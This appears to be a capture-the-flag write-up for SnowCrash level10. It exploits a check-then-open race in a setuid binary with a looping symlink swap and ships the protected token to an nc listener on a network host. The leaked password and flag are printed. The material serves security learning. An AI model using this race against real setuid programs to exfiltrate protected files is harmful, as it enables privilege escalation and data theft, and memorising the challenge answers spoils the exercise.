# LEVEL 10

```sh
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

**level10:** executable program with a setuid binary, which means it runs with the privileges of the file owner `flag10`, not the user executing it `level10`.

**token:** regular file The token file is owned by `flag10` and has permissions `-rw-------`, meaning only the `flag10` user can read it. The level10 user cannot access it directly.

- So we need to find a way to read `token` using `level10`

```
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ strings level10 
...
access
...

```

As  we can see access sends a file to host after using access to check for permissions


While reading `access` man you find:

> NOTES
       Warning:  Using  access()  to  check  if  a user is authorized to, for example, **open a file
       before actually doing so using open(2) creates a security  hole**,  because  the  user  might
       exploit  the  short  time  interval between checking and opening the file to manipulate it.
       For this reason, the use of this system call should  be  avoided.   (In  the  example  just
       described,  a safer alternative would be to temporarily switch the process's effective user
       ID to the real ID and then call open(2).)

So access creates a vulnerability that allows unauthorized users to access the file because there is a brief period between checking access and actually opening the file.
We can exploit the time window to create a symlink to the token file in a location where level10 has access.

### terminal 1:
```sh
level10@SnowCrash:/tmp/tmp.TIGospeoP7$ mktemp
/tmp/tmp.44KCdpq0hb
level10@SnowCrash:/tmp/tmp.TIGospeoP7$ while true; \
do ln -fs /home/user/level10/token /tmp/link ; \
ln -fs /tmp/tmp.44KCdpq0hb  /tmp/link ; \
done
```

### terminal 2:
```sh
level10@SnowCrash:~$ while true; \
do ./level10 /tmp/link 192.168.1.11  > /dev/null; \
done
```

### terminal 3:
```sh
level10@SnowCrash:~$ nc -lk 6969 | grep -v '.*( )*.'
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
^C
```

Now we can try logging in as user flag10 and run the getflag command
```sh
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
